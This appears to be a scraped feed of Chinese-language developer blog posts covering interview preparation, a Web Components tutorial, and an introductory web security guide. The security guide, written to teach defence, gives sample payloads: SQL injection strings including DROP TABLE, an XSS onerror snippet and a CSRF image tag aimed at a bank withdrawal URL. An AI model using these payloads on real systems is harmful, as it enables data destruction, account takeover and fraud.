LeetCode Interview，最後就是針對想要的公司準備，如果 LeetCode 沒有整理到的，可以直接搜尋「某某公司 面經」，面經中提到的題目雖然不會一直重複出，但面試前先看過以往題目的難度，心裡至少會有個底。

程式語言（Programming Language）程式語言的部分，會建議先看過招聘說明，通常會提到希望面試者會哪些語言，這時候再針對那個語言搜尋「某某語言 面經」，像是 Python 面經、NodeJS 面經等。這部分通常會針對該語言的特性提問，例如 Python 的 Immutable v.s. Mutable 或是 NodeJS Event Loop 等，通常每個語言都會有個經典考題是垃圾回收機制（Garbage Collection），最後要時常關注語言的 Latest Released 有沒有加入哪些新特性，這些也很容易成為面試題目！
作業系統（Operating System）作業系統的經典考題如下：

Process v.s. Thread v.s. Coroutine
Inter-Process Communication
調度策略（Scheduler）
死鎖（Deadlock）條件，以及如何解死鎖

作業系統的考題很大很雜，有時間的話，可以重新打基礎翻閱恐龍本（Operating System Concepts），但沒時間的話，建議可以上網看別人的整理，像是想理解 Process v.s. Thread v.s. Coroutine 相關的問題，很推薦 *Scheduling In Go 系列文章*，除了說明 Golang 怎麼實現 Coroutine，也順便理解 Golang 怎麼把 IO-Bound 的問題轉化為 CPU-Bound。
網路（Network）網路相關的經典考題如下：

TCP 三次握手與四次揮手過程，為什麼要三次握手？為什麼要四次揮手？
TCP v.s. UDP
TCP 如何實現流量控制
HTTP 有哪些狀態碼
HTTP v.s. HTTPS
HTTPS 加密過程
HTTP v.s. HTTP2
瀏覽器打開網頁的過程

藉由網路相關考題，推薦一個面試技巧 - 如果兩個項目之間有演進關係，先說前一項技術遇到什麼問題，再說後一項技術怎麼解決。以「HTTP v.s. HTTPS」為例，不要只是回答「HTTPS 有加密」，而是先說明 HTTP 遇到什麼問題：

無法驗證身份
訊息沒加密
無法驗證訊息完整性

然後再說明後一項技術 HTTPS 如何解決這些問題：

非對稱加密 - 驗證身份
對稱加密 - 將訊息加密
雜湊（Hash）- 驗證訊息完整性

系統設計（System Design）系統設計是我覺得最沒有標準答案的題目，原因是只要一個新技術沒有取代舊技術，那兩種技術間就會有選擇權衡的問題，像是 SQL v.s. NoSQL、Process v.s. Thread，兩種技術間沒有絕對的好與壞，只有適不適合某種情境而已，而系統設計相關的問題，就是要分析各種不同組合的技術，並說明為什麼要選某一種組合。
由於大多數學校沒有系統設計相關的課程，所以我會推薦先看*極客時間 - 從 0 開始學架構*，這個專欄有點像系統設計的工具箱，介紹不同種類的問題有哪些解決方式，先要知道有哪些工具可以用，這樣看系統設計的問題，才不會覺得是東補一塊西補一塊。
實際演練系統設計相關的面試題，我會推薦 *Grokking the System Design Interview*，這個課程會帶大家設計各種知名系統，並且也會說明實際遇到系統設計的面試題，要怎麼回答比較好。以下是我的一些心得：

跟面試官確定系統需要哪些功能
評估 DAU（Daily Active User）、流量、QPS &#x2F; TPS、硬碟儲存空間、記憶體空間等
設計 API
設計 Data Model
High Level Design，大致說明系統需要哪些 Component
Detailed Design，針對每個 API 進行架構設計，像是微信發紅包跟搶紅包的架構就不太一樣，有時更細緻的設計像是如何為每條 Tweet 生成 ID，這兩個問題分別在我上面提到的兩個課程都有。

最後要注意的是，系統設計是個演進的過程，不管在面試中還是實際設計時都一樣，所以在面試中要不斷的跟面試官來回討論，不要一直自顧自地想著要一步到位，有什麼想法就先拋出來跟面試官討論，面試官通常會回答這個方法可能有哪些問題，然後你再根據這些問題提出解決方案。
特定軟體面試官通常會依據你做過的專案來提問特定軟體的問題，像是說明某個網頁專案用到 Redis 時，面試官可能就會問「那你知道 Memcached 嗎？他們之間有什麼差異，為什麼選擇 Redis？」，然後就會出現一系列更進階的考題，像是「你知道 Redis 的 Sorted Set 怎麼實現的嗎？複雜度如何？」等等。有些招聘說明會特別提到團隊用了哪些軟體，這時候也可以針對這些軟體特別準備。以下列出特定軟體可能的面試問題：

Database
MySQL v.s. PostgreSQL
Index 有什麼好處？Database 怎麼做 Index？為什麼不要每個欄位都做 Index？
BTree v.s. B+Tree
SQL 相關的一些考題
MySQL 如何實現 Lock？


Memory Database
Redis v.s. Memcached
Redis 的 Sorted Set 如何實現？


Nginx
Nginx 的實現原理是什麼？為什麼一台 Nginx Server 就可能撐上萬的 QPS？



面經資源最後介紹一下找面經的好地方～

LeetCode Discuss，在 LeetCode 的討論板上，常常會有各大公司的面試分享。
一畝三分地，這個網站主要是針對各個公司的面經，雖然是以北美的公司為主，但如果對於進世界級的大公司有興趣，在上面可以找到很多資源。
掘金，這個網站則是以某個技術的面經為主，試著搜尋「Python 面经」，因為是對岸網站，所以搜尋上用簡體字，會比較容易找到想要的資源。

總結面試是一個互相選擇的過程，別總覺得是公司在挑你，其實你也在挑公司！如果面試官問你有沒有什麼問題？別說沒有，試著多問點問題，瞭解公司或團隊的狀況，畢竟進去一間公司後，發覺公司不好要離開，可能都要耗上半年的時間，所以要慎選公司！*Tech Interview Handbook* 有一些面試中可以反問面試官的問題可以參考。多點自信，其實你也在面試面試官！祝大家面試都順利！
關於作者：@frankyang 後端工程師，熱愛閱讀及嘗試新科技
]]></content>
      <tags>
        <tag>Web</tag>
        <tag>Backend</tag>
        <tag>Interview</tag>
      </tags>
  </entry>
  <entry>
    <title>2017，讓我們再來看看 Web Components 吧！</title>
    <url>/2017/01/06/web-components/</url>
    <content><![CDATA[前言先前研究 Progressive Web App 的時候就有注意到 Web Components 這個東西，也看過公司前輩使用過，甚至在前陣子 GDG DevFest Taipei 2016 的官方網站內，不僅使用 PWA，也採用了 Web Components 的技術（當然應該是用 Google 的 Polymer）來搭建。但還是很少看人使用與談論，我自己也是從來沒有仔細研究過（汗..
我稍微搜尋一下，大部分的介紹文章都是2013, 2014 年的，過了三年，Web Components 的 API 都從 v0 來到了 v1。除了瀏覽器的支援程度外，React 跟 Vue 等等的崛起相信也是主因之一，畢竟，React 寫起來這麼爽快，實在沒必要去專研一個支援度低，複雜度也不低的技術啊！
等等，那我寫這篇要幹麻…
欸不是，都已經 2017 年了，新的一年總要有些新的開始，剛剛也提到，API 版本從 v0 進化到 v1 了，加上 ES6 的支援越來越好，許多寫法都更漂亮了，是個好時機來認識一下這個強大的 web 標準！
為何需要 Web Components ?不論是什麼樣的程式，模組化在開發上都是很重要的一個概念，前端工程也不例外，我們都會希望能夠將 Web 開發過程中的 JS, CSS, HTML 封裝起來，以便後續重複使用，而過程中就會出現一些缺點：

js, css, html 三者的資源在最一般的網頁開發上基本上是分開管理，你如果想用別人的 library，可能還需要先載入對方需要的 JQuery，include 該套件需要的 css，最後才能在你的 HTML 內加入。

Scope 問題：即便是使用 React，都有可能遭遇到自己實作的 component 因為別人設定的 CSS class name 衝突而導致 Style 變動的情況。

相容性：各個 Framework 間的 components 基本上無法共用，當你的舊專案想移植到 React 上頭時，即便我們先不管 React 在狀態管理的機制，很多元件要能夠相容的話，也可能需要透過 webpack 等各種 hack 的方式才能成功。


關於前兩點，透過 React, Webpack 與 CSS Modules 都可以找到相對應的解法，而第三點相信透過許多 hack 也是可以解決。
而 Web Components 則是希望透過規範，用更好更方便的方式，解決這些問題。
Web Components 是 W3C 擬定的標準由下列四大規範組成：

HTML Templates
Custom Elements
Shadow DOM
HTML imports

其中除了 HTML Templates 外，皆尚處在 Drafts 階段。接下來會一一介紹。
不過這邊要先提醒一下，雖然剛剛用 React 來舉例比較，但實際上 React 與 Web Comoponent 真正要解決的問題是不同的，React 主旨在於 state 與 view 的狀態管理方式，而 Web Components 主力於整體元件的封裝，包含 Scoped CSS 等等。React component 內甚至可以載入 Web Components，畢竟 Web Components 可以只是 Plain JS, HTML, CSS。
先來個 Demo在進入規範的介紹前，怕大家覺得我騙台錢，先給大家看一下一個最簡單的 Web Component 會長什麼樣子。有興趣的話再往下看！
JS Bin on jsbin.com
可以看到在 &lt;body&gt; 的最下方，有個 &lt;gakki-div-template&gt; 的 tag，這就是我 create 出來的一個簡單的 Web Components，tag 內的文字就會像 Meme 一樣顯示在圖片上方。而圖片以及標題文字與 CSS 都是封裝在裡頭，就算我在外面對一樣的 class name 設定不同 style，(即使是 !important）都不會影響到。
整段 code 我只有載入一個 polyfill 的外部 js 檔案 webcomponents.min.js，但如果你是用 Chrome 53 以上版本，基本上不需要也能正常運作。
另外，會寫 Vue.js 的讀者可能會覺得有點點眼熟，基本上 Vue.js 的寫法跟概念都跟 Web components 雷同，Vue.js 等於是自己寫了一套 Web Components，並且提供更好的瀏覽器支援，所以如果喜歡 Web Components 的朋友們，在標準真的被各家瀏覽器實作前，可以先用用 Vue.js！
HTML TemplateTemplate 的概念在許多 Web Framework 當中都有，像是 Django(python), EJS&#x2F;Jade (Express&#x2F;Node)，雖然用法皆有所不同，但概念都是共通的，而已經成為 HTML5 標準的 &lt;template&gt; 也不例外。
&lt;template id=&quot;mytemplate&quot;&gt;  &lt;img src=&quot;&quot; alt=&quot;great image&quot;&gt;  &lt;div class=&quot;comment&quot;&gt;&lt;/div&gt;&lt;/template&gt;

以上述的 template 來說，我們在 html 裡面宣告一個 template，裡面包含一個 &lt;img&gt; 與 &lt;div&gt; 元件，在瀏覽器解析 HTML 文件時，template 的 DOM 物件並不會生效，裡頭包含的 Javascript 也不會執行，但是會產生一個 cloneable 的 DOM 物件，讓你在整個 web app 的生命週期都能使用。
來看一個簡單的使用情境：
假設我們要做一個簡單的 counter，計算 button 的點擊次數，然後每次都將次數新增到 button 下方的話，可以怎麼做？
可能會用字串串接的方式：
JS Bin on jsbin.com
但如果有了 template 的幫助，可以將 HTML 字串的部分與邏輯分開：
JS Bin on jsbin.com
source: html5rocks-html-template
&lt;button onclick=&quot;useIt()&quot;&gt;Use me&lt;/button&gt;&lt;div id=&quot;container&quot;&gt;&lt;/div&gt;&lt;script&gt;  function useIt() &#123;    const content = document.querySelector(&#x27;#counter-template&#x27;).content;    // Update something in the template DOM.    let span = content.querySelector(&#x27;span&#x27;);    span.textContent = parseInt(span.textContent) + 1;    document.querySelector(&#x27;#container&#x27;).appendChild(        document.importNode(content, true));  &#125;&lt;/script&gt;&lt;template id=&quot;counter-template&quot;&gt;  &lt;div&gt;Template used: &lt;span&gt;0&lt;/span&gt;&lt;/div&gt;&lt;/template&gt;

我們準備了一個 template，id 為 counter-template，在每次 button 被點選時，從 template 中取得目前的 content，將內容加一之後再 append 到 document 內。
雖然這個例子看起來，使用 template 反倒還要寫比較多 code，但是如果你今天需要產生的 template 是很複雜的 HTML 結構時，template 絕對可以為你帶來不少幫助的。
我們也可以直接複製 template 內容：
const content = document.querySelector(&#x27;#counter-template&#x27;).content;  const copyedContent = content.cloneNode(true);document.body.appendChild(copyedContent);  

Custom ElementsCustom Elements API 是構成 Web Components 的基礎之一，有了它的幫助，我們可以自己用最單純的 JS&#x2F;HTML&#x2F;CSS 來創造新的 HTML tags，或是 extend 別人的 components，甚至是擴展原有現存的 HTML tags；而也因為可以自行定義 tag 的名稱，讓標籤能夠更加語意化。
Chrome 在 version 33 時就有推出 v0 的 Custom Elements，而到了現在 version 55，已經採用 v1 的版本，雖然觀念是一樣的，但語法有許多差異，以下介紹皆為 v1 版本，並使用 ES6 的寫法。
要新增一個自定義的 HTML tag 很簡單：
class GakkiTemplate extends HTMLElement &#123;&#125;window.customElements.define(&#x27;gakki-div-template&#x27;, GakkiTemplate);

或是可以用暱名函式的方式
window.customElements.define(&#x27;gakki-div-template&#x27;, class extends HTMLElement &#123;&#125;);

兩種方式都可以讓你產生一個 &lt;gakki-div-template&gt;&lt;/gakki-div-template&gt; 的 tag。
其中我們用到 ES6 的 class 語法，來繼承 HTMLElement，這樣做可以讓我們的 GakkitTemplate 擁有所有 DOM API，並且讓你自己新增 Method 到你創建的這個 element 的 DOM interface 中。
拿最前面的 Demo 來舉例，宣告元素的地方我們可以修改成這樣：
JS Bin on jsbin.com
變動有點多，沒關係我們慢慢解釋：
class GakkiTemplate extends HTMLElement &#123;    ...      get light() &#123;    return this.hasAttribute(&#x27;light&#x27;);  &#125;  set light(val) &#123;    // Reflect the value of the light property as an HTML attribute.    if (val) &#123;      this.setAttribute(&#x27;light&#x27;, &#x27;&#x27;);    &#125; else &#123;      this.removeAttribute(&#x27;light&#x27;);    &#125;  &#125;  // Can define constructor arguments if you wish.  constructor() &#123;   ...  &#125;&#125;

首先是 get&#x2F;set，這兩個 method 代表賦予 light 這個 property getter&#x2F;setter 的功能，這個要做什麼呢？
假設當別人使用我們的 custom-element 時，有可能他們會想要能透過給予 light 這個 property 來設定以下的 style：
gakki-div-template[light] &#123;    opacity: 0.5&#125;

當然如果他直接設定 &lt;gakki-div-template light&gt;&lt;/gakki-div-template&gt; 就可以吃到 style，但多數時候我們會希望能用 JS 的方式來設置，像是：
var gakkiDiv = document.getElementsByTagName(&#x27;gakki-div-template&#x27;);gakkiDiv[0].light// 此時會觸發 getter，return this.hasAttribute(&#x27;light&#x27;);gakkiDiv[0].ligth = true;// 此時會觸發 setter，this.setAttribute(&#x27;light&#x27;, &#x27;&#x27;);
此時我們的 custom-elements 就需要給予 getter&#x2F;setter 的 method，並在其中設定 this.setAttribute() 的方式讓我們的 elements 吃得到該 property 的設定。（ Note: property 的名稱跟 get&#x2F;set 的名稱要相同）
再來是比較特別的兩個 method：
static get observedAttributes() &#123;    return [&#x27;add&#x27;];  &#125;...// Only called for the change attributes due to observedAttributesattributeChangedCallback(name, oldValue, newValue) &#123;    if (this.add) &#123;      this.addImg();    &#125;&#125;

透過定義 static get observedAttributes() 可以讓我們的 element 監聽該設定的 attributes 有沒有被 consumer 設置，如果有變動，會觸發 attributeChangedCallback() 來執行我們想要的動作。
那當然也可以加入自定義的 method，像是這邊的 addImg()；也可以在 constructor 的時候加入 EventListener，
// Setup a click listener on &lt;gakki-div-template&gt; itself.    this.addEventListener(&#x27;click&#x27;, e =&gt; &#123;           this.addImg();    &#125;);

Custom Elements - Life Cycle:Custom Elements 有自己的生命週期，前述的 attributeChangedCallback() 也是其中之一：

constructor：Custom Elements 建構式，通常會在這邊 create Shadow DOM。

connectedCallback：當你插入元件到 DOM 時會被呼叫。

disconnectedCallback：當你從 DOM 中移除元素時會被呼叫，可以在這邊 remove Event listener 之類的。

attributeChangedCallback(attrName, oldVal, newVal)：監聽的屬性有變動時會被呼叫。

adoptedCallback：整個 custom element 被人用 document.adoptNode(el) 呼叫時觸發。


可以玩玩看上述範例，看看我做了什麼無聊的功能 (畢竟只是範例麻 XD)。
除了 HTMLElement 外，你也可以繼承別人或是你自己的 Custom-Elements：
class FancyDrawer extends AppDrawer &#123;  constructor() &#123;    super(); // always call super() first in the ctor. This also calls the extended class&#x27; ctor.    ...  &#125;&#125;customElements.define(&#x27;fancy-app-drawer&#x27;, FancyDrawer);

或是繼承 Native Element：
// See https://html.spec.whatwg.org/multipage/indices.html#element-interfaces// for the list of other DOM interfaces.class FancyButton extends HTMLButtonElement &#123;  constructor() &#123;    super(); // always call super() first in the ctor.    this.addEventListener(&#x27;click&#x27;, e =&gt; this.drawRipple(e.offsetX, e.offsetY));  &#125;  // Material design ripple animation.  drawRipple(x, y) &#123;    let div = document.createElement(&#x27;div&#x27;);    div.classList.add(&#x27;ripple&#x27;);  &#125;&#125;customElements.define(&#x27;fancy-button&#x27;, FancyButton, &#123;extends: &#x27;button&#x27;&#125;);
這邊要注意的是，定義繼承 Native element 的元件時，需要傳入第三個參數 {extendds: ‘{native element you extend}’}表明你要繼承的元素是什麼，因為不同的 HTML tags 可能共享相同的 DOM interface，像是 &lt;q&gt; 與 &lt;blockquote&gt; 都是 HTMLQuoteElement。
而繼承 Native Element 的 Custom-Element 可以有另一種特殊使用方式（不過支援度更低 XD）：
&lt;!-- This &lt;button&gt; is a fancy button. --&gt;&lt;button is=&quot;fancy-button&quot; disabled&gt;Fancy button!&lt;/button&gt;

Shadow DOMShadow DOM 算是 Web Components 中的靈魂角色，主要就是設計來建構 Component-based 的 web app，它所帶來的好處有下列幾項：

Isolated DOM：在 Shadow DOM 裡面的任何 nodes 都不會被外面的 document.querySelector() 給取得，不會被汙染也不會去污染別人。

Scoped CSS：定義在 Shadow DOM 內的 CSS 其作用域就只在 Shadow DOM 當中，不會作用於 Shadow DOM 外的 elements，而其他 Page 的 style 也不會影響到 Shadow DOM 內的定義。

Composition：可以透過 Shodow DOM 賦予你的 component 擁有 Declarative, markup-based 的 API 可操作。

Productivity：既然有 Isolated DOM 跟 Scoped CSS，就可以將你的 web app 切割成多個 DOM object 組成，完成模組化的使命！


名詞介紹Shadow DOM：跟一般的 DOM 差異在於其產生的方式，以及他與頁面其他物件的互動方式。
shadow tree：一般來說你可以利用 document.createElement() 來創建 DOM，並 appendChild() 到其他 element 上，而 shadow dom 則是依附在某個 normal DOM 底下，產生一個 scoped subtree，稱作 shadow tree。
shadow host：掛載 shadow tree 的元素即為該 Shadow DOM 的 shadow host。
Create Shadow DOM其實 Shadow DOM 不一定要用在建構 Web components，要創建 Shadow DOM 只要用下列方式即可：
const header = document.createElement(&#x27;header&#x27;);const shadowRoot = header.attachShadow(&#123;mode: &#x27;open&#x27;&#125;);shadowRoot.innerHTML = `      &lt;style&gt;#menu &#123; ... &#125;&lt;/style&gt; &lt;!-- styles are scoped to fancy-menu! --&gt;      &lt;div id=&quot;menu&quot;&gt;...&lt;/div&gt;    `; // Could also use appendChild().// header.shadowRoot === shadowRoot// shadowRoot.host === header
這樣一來，你就有一個 header 底下的 Shadow DOM 了，裡面定義的 #menu style，不會向內外影響。
但並非所有 DOM 都可以掛載 Shadow DOM，有些事已經有自己的 Shadow DOM （像是 &lt;textarea&gt;, &lt;input&gt;），有些是沒什麼必要（像是 &lt;img&gt;）。
Create Shadow DOM for Custom Element在 Web Components 中，Shadow DOM 都會搭配 Custom Element 出現，如果說 Custom Element 提供 Web Component 骨幹 (HTML, DOM interface)，Shadow DOM 就是提供血和肉 (JS, Scoped CSS)。
一樣以我們剛剛的範例來看，在 Custom Element 中創建 Shadow DOM：
constructor() &#123;  super();  let shadowRoot = this.attachShadow(&#123;mode: &#x27;open&#x27;&#125;);  const t = document.querySelector(&#x27;#gakki-div-template&#x27;);  const instance = t.content.cloneNode(true);  shadowRoot.appendChild(instance);    this.shadowDOM = shadowRoot;  // Setup a click listener on &lt;gakki-div-template&gt; itself.  this.addEventListener(&#x27;click&#x27;, e =&gt; &#123;    this.addImg();  &#125;);&#125;

這邊有幾點要說明：

利用 this.attachShadow(&#123;mode: &#39;open&#39;&#125;) 來綁定 Shadow DOM 到目前的 Custom Element，其中的 &#123;mode: &#39;open&#39;&#125; 是代表這是個 open mode 的 Shadow DOM，host 這個 Shadow DOM 的 Element (以這邊的例子就是我們的 Custom Element）可以透過 JS 取得 Shadow DOM 內部的 DOM 元件，反之，如果設置為 close，即無法取得，官方不建議我們設定為 close，詳情可以參考 這裡

透過 const t = document.querySelector(&#39;#gakki-div-template&#39;); 我們取出 template，並利用 t.content.cloneNode() 複製一份 template，接著將此 template appendChild 到我們的 shadow tree 中。


透過這樣的方式，我們就擁有一個擁有 Scoped template 的 Custom Element，因為整個 Element 的內容都是透過 template 與 Shadow DOM 產生的，別人可以自由拿去使用，也不用擔心他們會污染到這個元件！
Slot element在我們範例的 template 中有個奇妙的元素 slot
&lt;template id=&quot;gakki-div-template&quot;&gt;  &lt;style&gt;    ...  &lt;/style&gt;  &lt;p&gt;Gakki Meme&lt;/p&gt;  &lt;div class=&quot;wrapper&quot;&gt;    &lt;img width=&quot;300px&quot; src=&quot;http://static.ettoday.net/images/2083/d2083850.jpg&quot; /&gt;    &lt;div class=&quot;slot&quot;&gt;      &lt;slot&gt;&lt;/slot&gt;    &lt;div&gt;  &lt;/div&gt;&lt;/template&gt;

它的用途很簡單，就是一個 placeholders，讓元件的 consumer 可以安插自己的 DOM 進去，而你透過 slot 的位置來決定這些 user 的 DOM 該放在哪些位置。
在範例中：
&lt;gakki-div-template light&gt;你好，我是森山&lt;/gakki-div-template&gt;

我們將文字 ‘你好，我是森山’，放入 custom element，他就會被我們安插到 &lt;slot&gt;&lt;/slot&gt; 的位置
如果有兩個以上的元素要插入的話，就需要用 name 來綁定：
&lt;gakki-div-template light&gt;  &lt;span slot=&quot;title&quot;&gt;你好，我是森山&lt;/span&gt;  &lt;div&gt;嗨..妳好&gt;//&lt; &lt;/div&gt;&lt;/gakki-div-template&gt;

&lt;template&gt;    ...    &lt;p&gt;Gakki Meme&lt;/p&gt;    &lt;div class=&quot;wrapper&quot;&gt;        &lt;img width=&quot;300px&quot; src=&quot;http://static.ettoday.net/images/2083/d2083850.jpg&quot; /&gt;        &lt;div class=&quot;slot&quot;&gt;            &lt;slot name=&quot;title&quot;&gt;&lt;/slot&gt;        &lt;/div&gt;        &lt;div class=&quot;slot2&quot;&gt;             &lt;slot&gt;&lt;/slot&gt;        &lt;/div&gt;    &lt;/div&gt;  ...&lt;/template&gt;
JS Bin on jsbin.com
你們也可以打開 DevTool 來看一下 Shadow DOM 的元件展開會是長什麼樣子，這邊就不再贅述。
Shadow DOM Styling接下來介紹如何在 Shadow DOM 中設定 CSS。
在 Shadow DOM 中的 CSS 其實跟一般使用上沒有太大差異，你所設定的 CSS selector 都是 local 的，也就是只能設定到 Shadow DOM 裡頭的 element，不會受外部影響，也不會影響到外部。
比較需要說明的有三個部分：

:host：

你可以用 :host 這個 selector 來設定你的 component 的 style，但要注意的是，:host 所設定的值，是可以被外部 component 的使用者蓋過去的。
像範例中為了讓 slot 的字能絕對定位，我需要把 &lt;gakki-div-template&gt; 本身設定為 relative
:host &#123;      position: relative;      display: block;      width: 300px;    &#125;


:host-context：讓你根據 Component 的 Context 來設定 style，像是：

當處於 darktheme class 下時，顏色要變成白色。
&lt;body class=&quot;darktheme&quot;&gt;  &lt;fancy-tabs&gt;    ...  &lt;/fancy-tabs&gt;&lt;/body&gt;&lt;style&gt;    :host-context(.darktheme) &#123;      color: white;      background: black;    &#125;&lt;/style&gt;


::slotted：最後則是透過 ::slotted，來控制傳入的 slot 元件的 style。

像範例中：
&lt;template&gt;    &lt;style&gt;        ...        ::slotted(#me)&#123;          color: blue;        &#125;        ...    &lt;/style&gt;    ...&lt;/template&gt;...&lt;gakki-div-template light&gt;  &lt;span slot=&quot;title&quot;&gt;你好，我是森山&lt;/span&gt;  &lt;div id=&quot;me&quot;&gt;嗨..妳好&gt;//&lt;&lt;/div&gt;&lt;/gakki-div-template&gt;

Event Handle in Shadow DOMShadow DOM 還有許多 Event 處理，包含 Slot 的 event 處理等等 issue 可以探討，這邊只簡單講個主要觀念。
在 Shadow DOM 中對於事件處理，是透過在 Event Bubble 的過程中，來重新定位 event target 的位置，讓該事件像是從 Host 的元件觸發，並且會擋掉可能影響到外部頁面的事件處理。
詳細可以看 這邊 與 這邊
HTML ImportWeb Component 的最後一哩路，當我們製作好我們的 Component 後，當然會希望能很方便地給他人使用，HTML Import 就是要處理這樣的問題。
他讓我們可以直接 link 一份 HTML 檔案，不管他是 template 也好，用 shadow dom 創建的 custom-element 也好，都可以直接 inlcude。
使用方法很簡單，假設我們範例中的 HTML 叫做 GakkiMeme.html，別人想要 include 的話，只要在他的 index.html 中加入 &lt;link rel=&quot;import&quot; href=&quot;GakkiMeme.html&quot;&gt; 即可使用：
index.html&lt;head&gt;  &lt;link rel=&quot;import&quot; href=&quot;GakkiMeme.html&quot;&gt;&lt;/head&gt;&lt;body&gt;  &lt;gakki-div-template&gt;    &lt;span slot=&#x27;title&#x27;&gt; 嗨嗨嗨 &lt;/span&gt;    &lt;div id=&quot;me&quot;&gt; 嘿嘿嘿 &lt;/div&gt;  &lt;/gakki-div-template&gt;&lt;/body&gt;
當然 Import 的部分還有很多可以玩，有興趣的可以到 HTML5rocks 研究。
ConclusionWeb Components 提供我們一種方式來建構 reusable components，能支援 Cross-browser (當然要等標準全通過，瀏覽器全支援，但相信那天會到來的！)；不需要任何 framework 支援；也不需要學特殊語法，就是 DOM&#x2F;CSS&#x2F;HTML&#x2F;JS；可以跟現有 Framework 共存使用。
相信在未來我們會有更美好的 Web 可以使用！
最後附上 Browser Support 的 Information 給各位：
custom-elementv1shadow-dom
資料來源
W3C Web Components
Custom Elements v1
Shadow DOM v1
Web Components整理及分享
Web Components 初探
basic-web-components
HTML Imports

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>web, web components, shadow dom, custom element</tag>
      </tags>
  </entry>
  <entry>
    <title>Web 資訊安全（Security）簡明入門教學指南</title>
    <url>/2016/11/05/web-security-tutorial-introduction/</url>
    <content><![CDATA[
前言隨著越來越多的服務和資料連上網路，Web 資訊安全已經是 Web 開發中一個重要的環節，然而許多開發者往往希望專注在應用程式的研發，而忽略了資訊安全的重要性。不過若是沒有嚴謹地考慮資訊安全的問題，等到事情發生後反而會造成更嚴重的財務和名譽上的損失。本文希望整理一些 Web 常見資訊安全（Security）的議題和學習資源和讀者一起教學相長，下次建構網路服務時可以更留心 Web 的資訊安全，甚至努力成為一個好的白帽駭客（White Hat Hacker）。
常見 Web 資訊安全（Security）議題一般而言 Web 資訊安全（Security）需要符合三點安全要素：

保密性：透過加密等方法確保資料的保密性
完整性：要求使用者取得的資料是完整不可被竄改的
可用性：保證網站服務的持續可訪問性

以下列出常見影響 Web 資訊安全（Security）的攻擊手法：

SQL Injection
 使用惡意的 SQL 語法去影響資料庫內容：
 // -- 為忽略掉後面的 SQL /user/profile?id=1&quot;;DROP TABLE user--SELECT * FROM USER WHERE id = &quot;1&quot;; DROP TABLE user--

 使用者登入：
 // password&quot; AND 1=1-- SELECT * FROM USER WHERE username = &quot;Mark&quot;; AND 1=1-- AND PASSWORD=&quot;1234&quot;

 簡易防範方式：不信任使用者輸入的資料，確保使用者輸入都要 escape 掉，目前許多成熟 Web 框架都有支援 ORM 服務，大部分都基本防範了 SQL Injection。

XSS（Cross-Site Scripting） XSS 亦即將惡意程式碼注入到網頁，讓看到網頁的使用者會受影響，常見的受災戶包括論壇、討論區等網路服務。事實上 XSS 概念很簡單，透過表單輸入建立一些惡意網址、惡意圖片網址或是 JavsScript 程式碼在 HTML 中注入，當使用者觀看頁面時即會觸發。
 &lt;IMG SRC=&quot;&quot;onerror=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;

 更多關於 XSS 資料可以參考 XSS Filter Evasion Cheat Sheet。另外也有簡體中文版 
 簡易防範方式：不信任使用者輸入的資料，將所有輸入內容編碼並過濾。

CSRF
 CSRF 跨站請求偽造 又被稱為 one-click attack 或者 session riding，通常縮寫為 CSRF 或者 XSRF， 是一種挾制用戶在當前已登入的 Web 應用程式上執行非本意的操作的攻擊方法。
 舉維基百科上的例子：假如一家銀行用以執行轉帳操作的URL地址如下： 
 http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=10000&amp;for=PayeeName
 那麼，一個惡意攻擊者可以在另一個網站上放置如下代碼： 
 &lt;img src=&quot;http://www.examplebank.com/withdraw?account=Mark&amp;amount=10000&amp;for=Bob&quot;&gt;
 若是使用者的登入資訊尚未過期的話就會損失 10000 元的金額。
 簡易防範方式：

檢查 Referer 欄位 這是比較基本的驗證方式，通常 HTTP 標頭中有一個 Referer 欄位，其應該和 Request 位置在同一個網域下，因此可以透過驗證是否是在同一個網域來驗證是否為惡意的請求，但會有被更改偽裝的可能。

添加驗證 token 一般現在許多的 Web Framework 都有提供在表單加入由 Server 生成的隨機驗證 CSRF 的碼，可以協助防止 CSRF 攻擊。



DoS Dos 阻斷式攻擊（Denial of Service Attack）又稱為洪水攻擊，是一種網路攻擊手法，其目的在於使目標電腦的網路或系統資源耗盡，使服務暫時中斷或停止，導致真正的使用者無法使用服務。
 根據維基百科：DoS 攻擊可以具體分成兩種形式：頻寬消耗型 以及 資源消耗型，它們都是透過大量合法或偽造的請求占用大量網路以及器材資源，以達到癱瘓網路以及系統的目的。
 頻寬消耗攻擊又分洪泛攻擊或放大攻擊：洪泛攻擊的特點是利用殭屍程式傳送大量流量至受損的受害者系統，目的在於堵塞其頻寬。放大攻擊和洪泛攻擊類似，是通過惡意放大流量限制受害者系統的頻寬；其特點是利用殭屍程式通過偽造的源 IP（即攻擊目標）向某些存在漏洞的伺服器傳送請求，伺服器在處理請求後向偽造的源 IP 傳送應答，由於這些服務的特殊性導致應答包比請求包更長，因此使用少量的頻寬就能使伺服器傳送大量的 Response 到目標主機上。
 資源消耗型又分為協定分析攻擊（SYN flood，SYN 洪水）、LAND attack、CC 攻擊、殭屍網路攻擊、Application level floods（應用程式級洪水攻擊）等。
 簡易防範方式：

防火牆 設定規則阻擋簡單攻擊

交換機 大多交換機有限制存取控制功能

路由器 大多路由器有限制存取控制功能

黑洞啟動 將請求轉到空介面或是不存在的位置



檔案上傳漏洞 許多網路應用程式可以讓使用者上傳檔案到伺服器端，由於我們不知道使用者會上傳什麼類型的檔案，若不留意就會造成很大的問題。
 簡單防範方式：

阻止非法文件上傳 

設定檔名白名單
文件標頭判斷


阻止非法文件執行 

存儲目錄與 Web 應用分離
存儲目錄無執行權限
文件重命名
圖片壓縮




加密安全 有許多的網路服務有提供會員註冊的服務，當使用者使用註冊時注意不要將密碼明碼存入資料庫。若是你使用的服務會在忘記密碼時寄明碼密碼給你很有可能該服務就是使用明碼加密，此時就很容易會榮登我的密碼沒加密的網站。不過儘管將密碼加密也未必安全，像是網路上就存在一些 破解網站、彩虹表 可以破解加密的密碼。所以通常我們會針對不同使用者使用隨機產生的 salt 字串來加鹽後加密的方式來提高密碼的強健性。
 sha3(salt + gap + password)

簡易資安入侵流程
偵查（Reconnaissance）攻擊者準備攻擊之前進行的調查，使用 Google 或是社交工程找尋目標的相關資訊，以利之後的攻擊

掃描（Scanning）掃描目標主機的弱點，取得主機作業系統、服務和運作狀況等相關資訊

取得權限（Gaining Access）利用系統弱點取得主機權限

維持權限（Maintaining Access）維持目前取得的權限，以便日後再次存取而不需繁雜的步驟

